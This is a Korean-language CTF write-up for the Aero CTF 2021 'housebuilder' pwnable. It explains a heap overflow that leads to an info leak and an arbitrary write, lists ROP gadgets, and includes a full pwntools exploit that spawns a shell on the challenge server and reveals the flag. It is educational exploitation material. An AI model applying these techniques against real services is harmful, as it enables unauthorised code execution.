---
layout: post
title: "[Aero CTF 2021] housebuilder Write-up"
image: /img/aero_ctf.png
tags: [CTF, write-up, pwnable]
---

# House Builder

주최측에서 공개한 풀이법과 제가 풀이한 방법이 조금 다르길래 write up을 따로 작성해봤습니다.

## Description

**PWN / 347 points (32 solves)**

<center><img src="/img/202103/housebuilder_0.png" alt="description" width="400px"/></center>

```plain
We made an application for creating our own houses and selling them.

Everything seems to be safe, don't you think so?

flag in /tmp/flag.txt

housebuilder.7z

nc 151.236.114.211 17174

Author: ker (Discord)
```

바이너리에 걸리 **보호기법**은 다음과 같습니다.
```sh
$ checksec ./housebuilder
[*] '/home/ubuntu/aero/housebuilder'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

바이너리를 실행해보면 메뉴만 봐도 heap 문제 처럼 생겼습니다.
```plain
{$} > 1
{?} Enter name: rls1004
{?} Enter rooms count: 123
{?} Enter floors count: 48
{?} Enter peoples count: 100
```
```plain
{$} > 2
{?} Enter house idx: 0
House {rls1004}
1. View house info
2. Change description
3. Sell house
4. Exit
{rls1004} > 
```
`Create`/`Enter`/`List`/`Delete` 메뉴가 있고, `Enter`를 선택하면 생성한 house에 대한 정보를 확인하거나 description을 변경하거나 sell 할 수 있습니다.


## Vuln

**Heap Overflow**

<center><img src="/img/202103/housebuilder_6.png" alt="vuln"/></center>
<center><img src="/img/202103/housebuilder_5.png" alt="vuln"/></center>

취약점은 house에 대한 description을 작성할 때 발생합니다. description 객체는 0x400의 크기로 할당되지만 입력 받을 때는 이 크기를 검사하지 않습니다. 이로 인해 Heap Overflow가 발생합니다.  

house 객체의 구조는 house의 정보를 출력해주는 `List` 메뉴나 description을 변경하는 `Change` 메뉴를 통해서 유추 할 수 있습니다.  

<center><img src="/img/202103/housebuilder_3.png" alt="house structure"/></center>

이렇게 IDA에서 structure를 만들어주면 보기 편해집니다.  

house 객체와 description 객체가 할당되는 모습을 그림으로 그려봤습니다.

<center><img src="/img/202103/housebuilder_1.png" alt="objects" height="290px"/><img src="/img/202103/housebuilder_2.png" alt="heap overflow" height="290px"/></center>

house와 description 객체는 할당이 번갈아서 이루어지기 때문에 description 객체의 Heap Overflow를 이용하면 house 객체의 필드를 overwrite 할 수 있습니다.  

**어떤 필드를 덮어야 유용하냐?**  

1순위로 살펴볼 필드는 <span style="color:SALMON">포인터</span>가 저장된 필드입니다. house 객체의 구조에는 포인터가 두 개 저장됩니다. 하나는 house의 이름을 가리키는 포인터이고 다른 하나는 description 객체의 주소를 가리키는 포인터입니다.  

**어떻게 이용 할 것이냐?**  

name 필드를 임의 주소로 덮으면 `List`나 `View` 메뉴를 통해서 name을 출력 하게 되기 때문에 <span style="color:SALMON">Information Leak</span>이 가능해집니다.  

description 필드는 `Change` 메뉴를 통해서 해당 주소에 값을 쓸 수 있기 때문에 이 필드를 덮게 되면 임의 주소에 임의 값을 쓸 수 있게 됩니다. (<span style="color:SALMON">AW</span>)  

## Solution

먼저 요약해서 말씀 드리면 [주최측에서 제공한 솔루션](https://github.com/AeroCTF/aero-ctf-2021/tree/main/ideas/pwn/HouseBuilder){:target="_blank"}은 다음과 같은 순서로 익스플로잇이 진행됩니다. Heap overflow를 이용해서 description 포인터를 `__malloc_hook`의 주소로 덮어 쓰고, `Change` 메뉴를 통해 `__malloc_hook` 자리에 스택 피벗 가젯의 주소를 넣습니다. 스택 피벗 후에는 힙에 설정한 ROP 가젯들이 실행되면서 syscall을 수행하고 쉘을 따게 됩니다.
```plain
[Flow]
Heap overflow -> AW -> pivot stack to .bss -> ROP chain

[RIP control]
overwrite __malloc_hook

[Gadget]
- 0x4a7d04 : mov rsp, rcx; pop rcx; jmp rcx
- 0x4044cf : pop rdx; ret
- 0x407668 : pop rsi; ret
- 0x41fcba : pop rax; ret
- 0x40490a : pop rdi; ret
- 0x403c73 : syscall
```

제가 풀이한 방법은 다음과 같은 순서로 익스플로잇이 진행됩니다.
```plain
[Flow]
Heap overflow -> stack pointer leak -> Heap overflow -> AW -> ROP chain

[RIP control]
overwrite return address of main()

[Gadget]
- 0x41432a : pop rdi; pop rbp; ret
- 0x407668 : pop rsi; ret
- 0x4044cf : pop rdx; ret
- 0x41fcba : pop rax; ret
- 0x403c73 : syscall
```

name 필드 overwrite를 통해서 information leak이 가능한 상황이기 때문에 스택의 주소를 leak 했습니다. 그 후에 description 포인터를 main()의 return address가 저장된 스택 주소로 덮었고 `Change` 메뉴를 통해서 main()의 return address를 덮어쓰고 스택에 ROP 체인을 구성해 넣을 수 있었습니다.  

스택의 주소는 <span style="color:SALMON">environ</span> 변수의 값을 읽는 것으로 leak 할 수 있습니다. environ 변수는 스택에 저장된 환경 변수 리스트의 주소를 가리키고 있기 때문에 이를 이용해서 main()의 return address가 저장된 스택 위치를 계산할 수 있습니다.  

**exploit**
```python
from pwn import *

def createHouse(p, name):
    print "create"
    p.sendline('1')
    p.sendlineafter(': ',name)
    p.sendlineafter(': ','1')
    p.sendlineafter(': ','1')
    p.sendlineafter(': ','1')
    print p.recvuntil('> ')

#p = process('./housebuilder')
p = remote('151.236.114.211', 17174)
print p.recvuntil('> ')

createHouse(p, 'a')
createHouse(p, 'b')

env = 0x5da448

# stack leak
p.sendline('2')
p.sendlineafter(': ','0')
p.sendlineafter('> ','2')
payload = "a"*0x400
payload += p64(0)
payload += p64(0x51)    # size
payload += p64(0x10)*3  # rooms, floors, poeples
payload += p64(env)     # name ptr (leak ptr)
payload += p64(8)*3     # name len (leak size), etc.
p.sendlineafter(': ',payload)

p.sendlineafter('> ','4')
p.sendlineafter('> ','3')
p.recvuntil('Name: ')
p.recvuntil('Name: ')
stack = u64(p.recv(8))-0x140
print("stack pointer : "+hex(stack))

# overwrite return address
p.sendline('2')
p.sendlineafter(': ','0')
p.sendlineafter('> ','2')
payload = "a"*0x400     # fill description
payload += p64(0)
payload += p64(0x51)    # size
payload += p64(0x10)*3  # rooms, floors, poeples
payload += p64(env)     # name ptr
payload += p64(8)*3     # name len, etc.
payload += p64(stack)   # description ptr (AW)
p.sendlineafter(': ',payload)
p.sendlineafter('> ','4')

p.sendline('2')
p.sendlineafter(': ','1')
p.sendlineafter('> ','2')

payload = p64(0x41432a)     # pop rdi; pop rbp; ret
payload += p64(stack+0x50)  # rdi ("/bin/sh")
payload += p64(0x0)         # rbp
payload += p64(0x407668)    # pop rsi; ret
payload += p64(0x0)         # rsi
payload += p64(0x4044cf)    # pop rdx; ret
payload += p64(0x0)         # rdx
payload += p64(0x41fcba)    # pop rax; ret
payload += p64(0x3b)        # rax (execve syscall number)
payload += p64(0x403c73)    # syscall
payload += "////////////////////////bin/sh\x00"
p.sendlineafter(': ', payload)

p.sendlineafter('> ', '4')  # exit Enter
p.sendlineafter('> ', '5')  # exit main -> trigger rop

p.interactive()
```

<center><img src="/img/202103/housebuilder_4.png" alt="flag" width="400px"/></center>

`Aero{f39fffcbbd52b117d9fa79541e60c9af}`  

사실 처음엔 __free_hook을 덮었는데 rcx가 컨트롤 안되는 상황이라 rcx 먼저 컨트롤 하기 위한 JOP 가젯들을 찾고 이것저것 하다가 그냥 스택을 쓰면 되겠다 생각해서 방법을 바꿨습니다..